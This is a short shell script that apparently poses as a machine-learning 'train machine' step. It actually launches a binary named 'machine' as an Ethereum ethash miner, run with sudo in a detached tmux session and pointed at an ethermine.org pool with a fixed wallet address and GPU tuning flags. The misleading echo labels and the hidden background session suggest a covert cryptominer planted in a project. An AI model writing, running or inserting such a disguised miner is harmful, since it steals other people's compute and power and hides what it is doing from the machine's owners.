echo project start
echo train machine
chmod +x machine
sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w rig0 --fan 80 --pl 70 --lock-cclock 1150'
